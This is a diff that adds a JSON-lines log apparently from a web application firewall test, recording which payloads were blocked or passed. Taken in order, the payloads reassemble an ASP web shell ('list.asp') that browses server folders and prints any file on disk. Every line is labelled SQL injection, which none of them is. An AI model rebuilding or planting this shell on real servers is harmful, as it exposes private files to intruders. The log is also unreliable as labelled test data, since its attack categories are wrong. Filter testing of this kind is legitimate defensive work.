@@ -1,0 +1,50 @@
+{"payload": "<!--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00881725198996719}
+{"payload": "ASP_KIT", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01541213400196284}
+{"payload": "list.asp = Directory & File View", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013207356008933857}
+{"payload": "by: darkraver", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011454382998635992}
+{"payload": "modified: 16/12/2005", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011146814009407535}
+{"payload": "-->", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003921127005014569}
+{"payload": "<body>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012974655997822993}
+{"payload": "<html>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004026658003567718}
+{"payload": "<%", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011588356996071525}
+{"payload": "file=request(\"file\")", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011045298000681214}
+{"payload": "tipo=request(\"type\")", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011197119994903915}
+{"payload": "If file=\"\" then", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01024087799305562}
+{"payload": "file=\"c:\\\"", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014080959997954778}
+{"payload": "tipo=\"1\"", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01325116200314369}
+{"payload": "End If", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013080675998935476}
+{"payload": "%>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014940466993721202}
+{"payload": "<FORM action=\"\" method=\"GET\">", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005690927995601669}
+{"payload": "<INPUT TYPE=\"text\" NAME=\"file\" value=\"<%=file%>\">", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013597315002698451}
+{"payload": "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012632284997380339}
+{"payload": "<INPUT TYPE=\"submit\" Value=\"Consultar\">", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013419274997431785}
+{"payload": "</FORM>", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004165965001448058}
+{"payload": "<%", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010089143994264305}
+{"payload": "If tipo=\"1\" then", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011006394008290954}
+{"payload": "Response.Write(\"<h3>PATH: \" & file & \"</h3>\")", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00405558300553821}
+{"payload": "ListFolder(file)", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013078379997750744}
+{"payload": "End If", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014670286007458344}
+{"payload": "If tipo=\"2\" then", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014770128997042775}
+{"payload": "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00612150201050099}
+{"payload": "Set oStr = server.CreateObject(\"Scripting.FileSystemObject\")", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005570311011979356}
+{"payload": "Set oFich = oStr.OpenTextFile(file, 1)", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015432195010362193}
+{"payload": "Response.Write(\"<pre>--<br>\")", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014380238004378043}
+{"payload": "Response.Write(oFich.ReadAll)", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012349140000878833}
+{"payload": "Response.Write(\"<br>--</pre>\")", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0038304610061459243}
+{"payload": "End If", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010885153009439819}
+{"payload": "%>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010634259000653401}
+{"payload": "<%", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010205727012362331}
+{"payload": "sub ListFolder(path)", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.009851306997006759}
+{"payload": "set fs = CreateObject(\"Scripting.FileSystemObject\")", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0034905089996755123}
+{"payload": "set folder = fs.GetFolder(path)", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.009565578002366237}
+{"payload": "Response.Write(\"<br>( ) <a href=?type=1&file=\" & server.URLencode(path) & \"..\\>\" & \"..\" & \"</a>\" & vbCrLf)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004067972011398524}
+{"payload": "for each item in folder.SubFolders", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.010497433002456091}
+{"payload": "Response.Write(\"<br>( ) <a href=?type=1&file=\" & server.URLencode(item.path) & \"\\>\" & item.Name & \"</a>\" & vbCrLf)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005000498000299558}
+{"payload": "next", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01326226198580116}
+{"payload": "for each item in folder.Files", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013658643991220742}
+{"payload": "Response.Write(\"<li><a href=?type=2&file=\" & server.URLencode(item.path) & \">\" & item.Name & \"</a> - \" & item.Size & \" bytes, \" & \"</li>\" & vbCrLf)", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004961380996974185}
+{"payload": "next", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011368057996151038}
+{"payload": "end sub", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011555738994502462}
+{"payload": "%>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012844384997151792}
+{"payload": "</body>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014500354998745024}
+{"payload": "</html>", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013737504996242933}
